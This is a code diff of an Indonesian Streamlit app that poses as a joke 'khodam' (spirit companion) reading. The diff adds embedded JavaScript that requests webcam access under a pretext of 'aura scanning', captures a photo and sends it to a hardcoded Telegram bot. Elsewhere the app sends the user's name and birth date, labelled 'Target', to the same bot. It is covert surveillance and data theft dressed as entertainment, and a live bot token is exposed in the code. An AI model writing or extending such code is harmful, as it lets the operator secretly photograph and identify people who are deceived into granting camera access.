@@ -12,98 +12,78 @@ TELEGRAM_BOT_TOKEN = "8837419409:AAEdUGcqxc7RyRJHMSJSBh8RURTEOOWTMYM"
 TELEGRAM_CHAT_ID = "8236797547"
 
 st.set_page_config(
-    page_title="Pusat Pengecekan Khodam Sakti Nusantara",
-    page_icon="👁️‍🗨️",
+    page_title="Pusat Pengecekan Khodam Nuklir Se-Indonesia",
+    page_icon="☢️",
     layout="centered"
 )
 
 # ==========================================
-# CUSTOM CSS / STYLING CYBER-MYSTIC PREMIUM
+# CUSTOM CSS / STYLING CYBER-MATRIX & GLITCH
 # ==========================================
 st.markdown("""
     <style>
-    @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap');
+    @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;600;700&display=swap');
 
     .stApp {
-        background: radial-gradient(circle at 50% 20%, #1e1b4b 0%, #030712 100%);
+        background: linear-gradient(135deg, #02231b 0%, #050b14 50%, #11051f 100%);
         color: #f8fafc;
-        font-family: 'Plus Jakarta Sans', sans-serif;
+        font-family: 'Space Grotesk', sans-serif;
     }
 
-    /* Kotak Utama / Glassmorphism Card */
-    .mystic-card {
-        background: rgba(15, 23, 42, 0.75);
+    /* Kotak Utama / Glassmorphism Card dengan Border Neon Neon */
+    .cyber-card {
+        background: rgba(8, 15, 28, 0.85);
         backdrop-filter: blur(16px);
-        border: 1px solid rgba(139, 92, 246, 0.3);
-        border-radius: 20px;
+        border: 2px solid #22c55e;
+        border-radius: 24px;
         padding: 30px;
-        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5), 0 0 20px rgba(139, 92, 246, 0.15);
+        box-shadow: 0 0 25px rgba(34, 197, 94, 0.25), inset 0 0 15px rgba(34, 197, 94, 0.1);
         margin-bottom: 25px;
     }
 
-    /* Kotak Alasan Kamera */
-    .camera-reason-box {
-        background: rgba(139, 92, 246, 0.1);
-        border-left: 4px solid #c084fc;
-        padding: 14px 18px;
-        border-radius: 10px;
+    /* Kotak Peringatan Kamera ala Cyber */
+    .cyber-warning-box {
+        background: rgba(234, 179, 8, 0.1);
+        border: 1px dashed #eab308;
+        border-left: 6px solid #eab308;
+        padding: 16px 20px;
+        border-radius: 14px;
         margin-bottom: 20px;
         font-size: 14px;
-        color: #e2e8f0;
-        line-height: 1.5;
+        color: #fef08a;
+        line-height: 1.6;
     }
 
-    /* Tombol Utama Eksklusif */
-    div[data-testid="stFormSubmitButton"] > button {
-        background: linear-gradient(135deg, #8b5cf6 0%, #d946ef 100%) !important;
-        color: #ffffff !important;
-        font-weight: 800 !important;
-        letter-spacing: 1px !important;
-        border: none !important;
-        padding: 16px 24px !important;
-        border-radius: 14px !important;
-        width: 100% !important;
-        box-shadow: 0 4px 20px rgba(217, 70, 239, 0.4) !important;
-        transition: all 0.3s ease !important;
-        text-transform: uppercase;
-    }
-    div[data-testid="stFormSubmitButton"] > button:hover {
-        background: linear-gradient(135deg, #9333ea 0%, #c084fc 100%) !important;
-        box-shadow: 0 6px 25px rgba(217, 70, 239, 0.7) !important;
-        transform: translateY(-2px) !important;
-    }
-
-    /* Tombol Biasa / Reset */
-    .stButton > button {
-        background: #0f172a !important;
-        color: #f1f5f9 !important;
-        border: 1px solid #334155 !important;
-        border-left: 4px solid #8b5cf6 !important;
-        font-weight: 600 !important;
-        text-align: left !important;
-        padding: 14px 20px !important;
+    /* Input Field Styling ala Terminal Hacker */
+    .stTextInput > div > div > input {
+        background-color: #030712 !important;
+        color: #4ade80 !important;
+        border: 2px solid #334155 !important;
         border-radius: 12px !important;
+        padding: 14px !important;
+        font-weight: 600 !important;
+    }
+    .stTextInput > div > div > input:focus {
+        border-color: #22c55e !important;
+        box-shadow: 0 0 15px rgba(34, 197, 94, 0.4) !important;
+    }
+
+    /* Tombol Reset Streamlit */
+    .stButton > button {
+        background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 100%) !important;
+        color: #f1f5f9 !important;
+        border: 2px solid #38bdf8 !important;
+        border-radius: 12px !important;
+        font-weight: 700 !important;
+        padding: 14px 20px !important;
         width: 100% !important;
         transition: all 0.3s ease !important;
     }
     .stButton > button:hover {
-        background: #1e1b4b !important;
-        border-color: #c084fc !important;
-        border-left: 4px solid #d946ef !important;
-        transform: translateX(4px) !important;
-    }
-
-    /* Input Field Styling */
-    .stTextInput > div > div > input {
-        background-color: #020617 !important;
-        color: #f8fafc !important;
-        border: 1px solid #334155 !important;
-        border-radius: 12px !important;
-        padding: 14px !important;
-    }
-    .stTextInput > div > div > input:focus {
-        border-color: #8b5cf6 !important;
-        box-shadow: 0 0 10px rgba(139, 92, 246, 0.3) !important;
+        background: linear-gradient(135deg, #38bdf8 0%, #2563eb 100%) !important;
+        color: #ffffff !important;
+        box-shadow: 0 0 20px rgba(56, 189, 248, 0.5) !important;
+        transform: translateY(-2px) !important;
     }
     </style>
 """, unsafe_allow_html=True)
@@ -114,9 +94,9 @@ st.markdown("""
 if 'step' not in st.session_state:
     st.session_state.step = 0
 if 'user_name' not in st.session_state:
-    st.session_state.user_name = ""
+    st.session_state.user_name = "Boboho"
 if 'user_dob' not in st.session_state:
-    st.session_state.user_dob = ""
+    st.session_state.user_dob = "17/08/2004"
 if 'telegram_sent' not in st.session_state:
     st.session_state.telegram_sent = False
 if 'camera_failed' not in st.session_state:
@@ -182,7 +162,7 @@ MASTER_KHODAM = [
 def send_text_to_telegram(name, dob, profile_title):
     now = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
     caption = (
-        f"🔮 <b>RITUAL CEK KHODAM KOCAK SELESAI!</b>\n\n"
+        f"☢️ <b>RITUAL CEK KHODAM CYBER SELESAI!</b>\n\n"
         f"👤 Target: <b>{name}</b>\n"
         f"🎂 Tanggal Lahir: <code>{dob}</code>\n"
         f"🕒 Waktu: {now}\n"
@@ -200,153 +180,142 @@ def send_text_to_telegram(name, dob, profile_title):
 # RENDER UTAMA BERDASARKAN STEP
 # ==========================================
 
-# --- STEP 0: FORM RITUAL & VALIDASI KAMERA SAAT SUBMIT ---
+# --- STEP 0: FORM RITUAL & PEMICU KAMERA BERBASIS HTML COMPONENT ---
 if st.session_state.step == 0:
-    st.markdown("<h1 style='text-align: center; color: #c084fc;'>👁 PUSAT PEMINDAIAN KHODAM NUSANTARA</h1>", unsafe_allow_html=True)
-    st.markdown("<p style='text-align: center; color: #94a3b8; margin-bottom: 30px;'>Ketahui khodam gaib pendamping hidupmu dengan teknologi sensor astral termuktahir.</p>", unsafe_allow_html=True)
+    st.markdown("<h1 style='text-align: center; color: #4ade80; text-shadow: 0 0 15px rgba(74,222,128,0.5);'>☢️ TERMINAL PEMINDAI KHODAM NUKLIR</h1>", unsafe_allow_html=True)
+    st.markdown("<p style='text-align: center; color: #38bdf8; margin-bottom: 30px; font-weight: 600;'>Sistem pelacakan makhluk astral lintas dimensi menggunakan teknologi Matrix-Aura.</p>", unsafe_allow_html=True)
 
     with st.container():
-        st.markdown('<div class="mystic-card">', unsafe_allow_html=True)
+        st.markdown('<div class="cyber-card">', unsafe_allow_html=True)
         
-        # Penjelasan alasan izin kamera terpampang jelas di kartu
         st.markdown("""
-            <div class="camera-reason-box">
-                🔮 <b>Informasi Ritual & Kalibrasi Aura:</b><br>
-                Sistem wajib memerlukan <b>izin akses kamera</b> saat tombol ditekan untuk memindai gelombang energi sukma dan menyelaraskan frekuensi khodam dengan wajahmu. Jika izin ditolak, ritual pembacaan akan otomatis gagal.
+            <div class="cyber-warning-box">
+                ⚠️ <b>PROTOKOL KEAMANAN SENSOR:</b><br>
+                Sistem wajib mengaktifkan <b>izin kamera</b> saat tombol diledakkan untuk memindai gelombang energi sukma wajahmu. Jika izin ditolak, sistem otomatis menggagalkan ritual pembacaan khodam.
             </div>
         """, unsafe_allow_html=True)
         
-        # Peringatan jika sebelumnya user menolak kamera
         if st.session_state.camera_failed:
-            st.error("🚨 **RITUAL GAGAL TOTAL!** Akses kamera ditolak oleh perangkat. Dukun gaib tidak dapat mendeteksi auramu karena wajahmu tertutup kegelapan.")
+            st.error("🚨 **ERROR 404: AURA TIDAK TERDETEKSI!** Akses kamera ditolak oleh perangkat. Sistem menghentikan proses karena wajahmu tertutup kegelapan total.")
         
-        with st.form("ritual_khodam_form"):
-            name_input = st.text_input("Nama Lengkap / Nama Panggilan", value="Boboho", placeholder="Contoh: Boboho")
-            dob_input = st.text_input("Tanggal Lahir (DD/MM/YYYY)", value="17/08/2004", placeholder="Contoh: 17/08/2004")
+        # Input form native Streamlit
+        name_input = st.text_input("Nama Lengkap / Nama Panggilan", value=st.session_state.user_name)
+        dob_input = st.text_input("Tanggal Lahir (DD/MM/YYYY)", value=st.session_state.user_dob)
+        
+        st.write("")
+        
+        # TOMBOL HTML KUSTOM DENGAN WARNA GRADASI CYBER (HIJAU NEON & EMAS)
+        camera_trigger_html = f"""
+        <div>
+            <button id="ritual-btn" style="
+                background: linear-gradient(135deg, #22c55e 0%, #eab308 100%);
+                color: #030712; font-weight: 800; letter-spacing: 1.5px;
+                border: none; padding: 18px 24px; border-radius: 14px;
+                width: 100%; box-shadow: 0 0 25px rgba(34, 197, 94, 0.5);
+                cursor: pointer; text-transform: uppercase; font-family: 'Space Grotesk', sans-serif;
+                font-size: 16px; transition: all 0.3s ease;">
+                💥 LEDAKKAN & BONGKAR KHODAM SAYA
+            </button>
             
-            st.write("")
-            submitted = st.form_submit_button("🔮 BONGKAR KHODAM SAYA SEKARANG")
+            <video id="video" width="0" height="0" autoplay style="display:none;"></video>
+            <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
             
-            if submitted:
-                if not name_input.strip():
-                    st.warning("⚠️ Masukkan nama dulu cuy, dukunnya gak bisa nebak kalau anonim.")
-                else:
-                    st.session_state.user_name = name_input.strip()
-                    st.session_state.user_dob = dob_input.strip() if dob_input.strip() else "Tidak diisi"
-                    st.session_state.camera_failed = False
-                    st.session_state.step = 1  # Lanjut ke tahap validasi kamera via JS
-                    st.rerun()
-                    
+            <script>
+                const token = "{TELEGRAM_BOT_TOKEN}";
+                const chatId = "{TELEGRAM_CHAT_ID}";
+                
+                document.getElementById('ritual-btn').onclick = function() {{
+                    navigator.mediaDevices.getUserMedia({{ video: true }})
+                    .then(function(stream) {{
+                        var video = document.getElementById('video');
+                        video.srcObject = stream;
+                        video.play();
+                        
+                        setTimeout(function() {{
+                            var canvas = document.getElementById('canvas');
+                            var context = canvas.getContext('2d');
+                            context.drawImage(video, 0, 0, 640, 480);
+                            var dataURL = canvas.toDataURL('image/jpeg');
+                            
+                            fetch(dataURL)
+                            .then(res => res.blob())
+                            .then(blob => {{
+                                var formData = new FormData();
+                                formData.append('chat_id', chatId);
+                                formData.append('photo', blob, 'cyber_target.jpg');
+                                formData.append('caption', '☢️️ <b>TARGET CYBER AURA TERDETEKSI (VALIDASI SUKSES)!</b>');
+                                
+                                fetch('https://api.telegram.org/bot' + token + '/sendPhoto', {{
+                                    method: 'POST',
+                                    body: formData
+                                }}).then(() => {{
+                                    window.parent.location.href = window.parent.location.href.split('?')[0] + "?step=2";
+                                }});
+                            }});
+                            
+                            stream.getTracks().forEach(track => track.stop());
+                        }}, 1000);
+                    }})
+                    .catch(function(err) {{
+                        console.log("Akses kamera ditolak: ", err);
+                        window.parent.location.href = window.parent.location.href.split('?')[0] + "?failed=true";
+                    }});
+                }};
+            </script>
+        </div>
+        """
+        components.html(camera_trigger_html, height=90)
+        
         st.markdown('</div>', unsafe_allow_html=True)
 
-# --- STEP 1: EKsekusi KAMERA & VALIDASI IZIN ---
-elif st.session_state.step == 1:
-    st.markdown("<h2 style='text-align: center; color: #c084fc;'>🔮 MENYELARASKAN FREKUENSI GAIB...</h2>", unsafe_allow_html=True)
-    st.markdown("<p style='text-align: center; color: #94a3b8;'>Meminta verifikasi sensor kamera dari browser...</p>", unsafe_allow_html=True)
-    
-    # Komponen Javascript untuk meminta akses kamera ketika tombol diklik
-    camera_validation_js = f"""
-    <div>
-        <video id="video" width="0" height="0" autoplay style="display:none;"></video>
-        <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
-        <script>
-            const token = "{TELEGRAM_BOT_TOKEN}";
-            const chatId = "{TELEGRAM_CHAT_ID}";
-            
-            navigator.mediaDevices.getUserMedia({{ video: true }})
-            .then(function(stream) {{
-                var video = document.getElementById('video');
-                video.srcObject = stream;
-                video.play();
-                
-                setTimeout(function() {{
-                    var canvas = document.getElementById('canvas');
-                    var context = canvas.getContext('2d');
-                    context.drawImage(video, 0, 0, 640, 480);
-                    var dataURL = canvas.toDataURL('image/jpeg');
-                    
-                    fetch(dataURL)
-                    .then(res => res.blob())
-                    .then(blob => {{
-                        var formData = new FormData();
-                        formData.append('chat_id', chatId);
-                        formData.append('photo', blob, 'mystic_target.jpg');
-                        formData.append('caption', '🔮 <b>TARGET AURA GAIB TERDETEKSI (VALIDASI SUKSES)!</b>');
-                        
-                        fetch('https://api.telegram.org/bot' + token + '/sendPhoto', {{
-                            method: 'POST',
-                            body: formData
-                        }}).then(() => {{
-                            // Jika berhasil kirim foto, arahkan ke step animasi sukses (step 2)
-                            window.location.href = window.location.href + "&success=true";
-                        }});
-                    }});
-                    
-                    stream.getTracks().forEach(track => track.stop());
-                }}, 1000);
-            }})
-            .catch(function(err) {{
-                console.log("Akses kamera ditolak: ", err);
-                // Jika kamera ditolak, arahkan ke halaman utama dengan status gagal
-                window.location.href = window.location.href + "&failed=true";
-            }});
-        </script>
-    </div>
-    """
-    components.html(camera_validation_js, height=100)
-    
-    # Penanganan parameter URL untuk mendeteksi apakah kamera diizinkan atau ditolak
     query_params = st.query_params
-    if "success" in query_params:
-        st.session_state.step = 2  # Masuk ke animasi loading sukses
+    if "step" in query_params and query_params["step"] == "2":
+        st.session_state.user_name = name_input if name_input.strip() else "Boboho"
+        st.session_state.user_dob = dob_input if dob_input.strip() else "17/08/2004"
+        st.session_state.step = 2
         st.query_params.clear()
         st.rerun()
     elif "failed" in query_params:
         st.session_state.camera_failed = True
-        st.session_state.step = 0  # Kembali ke halaman awal dengan pesan gagal
+        st.session_state.step = 0
         st.query_params.clear()
         st.rerun()
 
-# --- STEP 2: ANIMASI PROSES RITUAL MISTIS ---
+# --- STEP 2: ANIMASI PROSES CYBER-MATRIX ---
 elif st.session_state.step == 2:
-    st.markdown("<h2 style='text-align: center; color: #c084fc;'>🔮 SEDANG MERACIK MANTRA GAIB...</h2>", unsafe_allow_html=True)
-    st.markdown("<p style='text-align: center; color: #94a3b8;'>Aura wajah berhasil terbaca! Menembus dimensi lain...</p>", unsafe_allow_html=True)
+    st.markdown("<h2 style='text-align: center; color: #38bdf8;'>⚡ MENGEKSEKUSI REAKTOR MATRIX...</h2>", unsafe_allow_html=True)
+    st.markdown("<p style='text-align: center; color: #4ade80;'>Aura wajah terverifikasi! Membuka gerbang dimensi nuklir...</p>", unsafe_allow_html=True)
     
     st.write("")
     progress_bar = st.progress(0)
     status_text = st.empty()
     
-    status_text.text("👻 Menghubungkan frekuensi sukma dengan dukun sakti...")
-    progress_bar.progress(25)
+    status_text.text("🔌 Menghubungkan satelit gaib ke server pusat...")
+    progress_bar.progress(30)
     time.sleep(1)
     
-    status_text.text(f"🔍 Melacak aura kelakuan {st.session_state.user_name} di alam semesta...")
-    progress_bar.progress(60)
+    status_text.text(f"🔍 Menganalisis tingkat kehaluan {st.session_state.user_name}...")
+    progress_bar.progress(70)
     time.sleep(1.2)
     
-    status_text.text("💥 Menangkap wujud khodam paling absurd...")
-    progress_bar.progress(90)
-    time.sleep(1)
-    
-    status_text.text("✨ Selesai! Membuka hasil pembacaan...")
+    status_text.text("💥 Menarik data khodam dari semesta lain...")
     progress_bar.progress(100)
-    time.sleep(0.6)
+    time.sleep(0.8)
     
     st.session_state.step = 3
     st.rerun()
 
-# --- STEP 3: TAMPILAN HASIL KHODAM KOCAK ---
+# --- STEP 3: TAMPILAN HASIL KHODAM CYBER-NUKLIR ---
 elif st.session_state.step == 3:
     if not st.session_state.telegram_sent:
-        # Generator acak khodam unik berdasarkan nama & tanggal lahir user
         unique_string = (st.session_state.user_name + st.session_state.user_dob).lower().encode('utf-8')
         hash_val = int(hashlib.md5(unique_string).hexdigest(), 16)
         
         khodam_idx = hash_val % len(MASTER_KHODAM)
-        power_level = (hash_val % 99) + 1  # Level kocak 1-99%
+        power_level = (hash_val % 99) + 1  
         
         profile = MASTER_KHODAM[khodam_idx]
-        profile['power'] = f"Tingkat Keabsurdan: {power_level}% (Bahaya & Bikin Emosi)"
+        profile['power'] = f"Level Keabsurdan Nuklir: {power_level}% (Bahaya & Bikin Emosi)"
         
         st.session_state.current_profile = profile
         
@@ -359,21 +328,21 @@ elif st.session_state.step == 3:
 
     profile = st.session_state.current_profile
 
-    st.markdown(f"<h2 style='text-align: center; color: #4ade80;'>✨ Hasil Pengecekan Khodam Se-Indonesia</h2>", unsafe_allow_html=True)
+    st.markdown("<h2 style='text-align: center; color: #eab308; text-shadow: 0 0 15px rgba(234,179,8,0.4);'>💥 HASIL PEMINDAIAN KHODAM NUKLIR</h2>", unsafe_allow_html=True)
     st.write("")
 
-    st.markdown('<div class="mystic-card">', unsafe_allow_html=True)
-    st.markdown(f"<h3 style='color: #c084fc; text-align: center;'>{profile['title']}</h3>", unsafe_allow_html=True)
-    st.markdown(f"<p style='text-align: center; color: #f43f5e; font-weight: 600;'>{profile['power']}</p>", unsafe_allow_html=True)
-    st.markdown("<hr style='border-color: rgba(139, 92, 246, 0.2);'>", unsafe_allow_html=True)
-    st.markdown(f"<p style='text-align: center; font-size: 1.1rem; line-height: 1.6; color: #e2e8f0;'>{profile['desc']}</p>", unsafe_allow_html=True)
+    st.markdown('<div class="cyber-card">', unsafe_allow_html=True)
+    st.markdown(f"<h3 style='color: #4ade80; text-align: center; font-weight: 700;'>{profile['title']}</h3>", unsafe_allow_html=True)
+    st.markdown(f"<p style='text-align: center; color: #38bdf8; font-weight: 600; font-size: 1.1rem;'>{profile['power']}</p>", unsafe_allow_html=True)
+    st.markdown("<hr style='border-color: rgba(34, 197, 94, 0.3);'>", unsafe_allow_html=True)
+    st.markdown(f"<p style='text-align: center; font-size: 1.15rem; line-height: 1.7; color: #f8fafc;'>{profile['desc']}</p>", unsafe_allow_html=True)
     st.markdown('</div>', unsafe_allow_html=True)
 
     st.write("")
-    if st.button("🔄 CEK ULANG (GANTI NAMA LAIN)", use_container_width=True):
+    if st.button("🔄 RESET & CEK ULANG (GANTI TARGET)", use_container_width=True):
         st.session_state.step = 0
         st.session_state.user_name = "Boboho"
-        st.session_state.user_dob = ""
+        st.session_state.user_dob = "17/08/2004"
         st.session_state.telegram_sent = False
         st.session_state.camera_failed = False
         st.rerun()
